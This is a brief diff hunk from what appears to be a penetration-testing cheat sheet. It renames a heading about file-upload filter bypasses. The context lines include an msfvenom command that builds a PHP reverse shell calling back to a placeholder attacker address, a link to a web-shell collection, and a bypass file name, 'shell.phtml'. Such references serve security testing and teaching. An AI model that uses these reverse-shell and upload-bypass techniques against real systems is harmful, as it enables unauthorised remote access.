@@ -845,7 +845,7 @@ https://github.com/danielmiessler/SecLists/tree/master/Web-Shells
 $ msfvenom -p php/reverse_php LHOST=<IP address> LPORT=<port> -f raw > reverse.php	
 ```
 
-- Upload Blacklist Bypass
+- Upload Bypasses
 
 ```
 shell.phtml
